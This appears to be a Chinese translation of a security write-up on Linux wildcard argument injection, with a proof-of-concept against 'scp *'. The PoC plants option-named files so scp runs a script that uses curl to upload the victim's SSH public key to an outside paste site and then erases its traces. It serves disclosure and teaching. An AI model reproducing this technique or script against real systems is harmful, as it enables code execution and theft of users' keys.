# Linux 通配符可能产生的问题

from:https://dicesoft.net/projects/wildcard-code-execution-exploit.htm

0x00 通配符
--------

* * *

当你在一个bash命令行中输入“*”时，bash会扩展到当前目录的所有文件，然后将他们全部作为参数传递给程序。例如：`rm *`，将会删除掉当前目录的所有文件。

0x01 文件名被当做参数
-------------

* * *

大多数的命令行程序受此影响。例如ls命令，当不适用任何参数时，输出是这个样子的：

```
[stephen@superX foo]$ ls
asdf.txt  foobar  -l

```

如果你想要知道这些文件所属的组和用户，你可以通过”-l"参数来查看：

```
[stephen@superX foo]$ ls -l
total 0
-rw-r--r-- 1 stephen stephen 0 Jun 20 19:10 asdf.txt
-rw-r--r-- 1 stephen stephen 0 Jun 20 19:10 foobar
-rw-r--r-- 1 stephen stephen 0 Jun 20 19:10 -l

```

注意，有一个名字是“-l”的文件，我们试试“ls *”会发生什么。

```
[stephen@superX foo]$ ls *
-rw-r--r-- 1 stephen stephen 0 Jun 20 19:10 asdf.txt
-rw-r--r-- 1 stephen stephen 0 Jun 20 19:10 foobar

```

与之前不同的是"ls *” 没有输出-l文件，-l文件被当做了此命令的参数。

此条命令相当于运行：

```
[stephen@superX foo]$ ls asdf.txt foobar -l
-rw-r--r-- 1 stephen stephen 0 Jun 20 19:10 asdf.txt
-rw-r--r-- 1 stephen stephen 0 Jun 20 19:10 foobar  

```

0x02 安全问题
---------

* * *

此问题可能导致一些安全问题，当有人参数当中带有一个通配符，又没有事先检查目录下的文件名称。这可能被用来攻击别人电脑。

这个问题是众所周知的，在[http://seclists.org/fulldisclosure/2011/Sep/190](http://seclists.org/fulldisclosure/2011/Sep/190)已经有关于此问题的讨论。

0x03 Proof of Concept Exploit
-----------------------------

* * *

为了证明这个问题可以转化为一个任意代码执行攻击，我们尝试攻击“scp”命令，scp命令提供了-o选项，配置ssh，SSh有涉及运行命令的选项，我们可以利用这一点，让我们的脚本运行。

假设我们有一个目录的控制权限，在该目录下受害者将运行以下命令（想象一下，用户只下载一个web应用程序的源代码，并上传到他们的网络服务器上）：

```
$ scp * user@example.org:/var/www/

```

为了利用这个命令，在目录下我们需要放几个文件：

```
"-o" - SCP 将会把这个文件当做 "-o” 参数。
"ProxyCommand sh supercool.sh %h %p" - SCP 将会把这个文件当做 "-o" 的一个参数。
"supercool.sh" - 这个脚本将会被执行。
"zzz.txt" - 没有任何用处的测试文件。

```

在supercool.sh文件里，有一些恶意的命令：

```
#!/bin/sh

# Upload their SSH public key to the Internet, and put a scary message in /tmp/.
echo "By @DefuseSec and @redragonx..." > /tmp/you-have-been-hacked.txt
echo "This could have been your private key..." >> /tmp/you-have-been-hacked.txt
curl -s -d "jscrypt=no" -d "lifetime=864000"                                \
        -d "shorturl=yes" --data-urlencode "paste@$HOME/.ssh/id_rsa.pub"    \
        https://defuse.ca/bin/add.php -D - |                                \
        grep Location | cut -d " " -f 2 >> /tmp/you-have-been-hacked.txt

# Delete evidence of our attack.
rm ./-o ProxyCommand\ sh\ supercool.sh\ %h\ %p 
echo > ./supercool.sh

# Do what ProxyCommand is supposed to do.
nc -p 22332 -w 5 $1 $2

```

当受害者执行命令时：

```
$ scp * user@example.org:/var/www/
supercool.sh
zzz.txt

```

当他检查自己的/tmp目录下的时候将会看到：

```
$ cat /tmp/you-have-been-hacked.txt
By @DefuseSec and @redragonx...
This could have been your private key...
https://defuse.ca/b/QQ3nxADu 

```

可以在这里下载完整的poc文件：[poc.zip](http://static.wooyun.org/20141017/2014101711552836274.zip)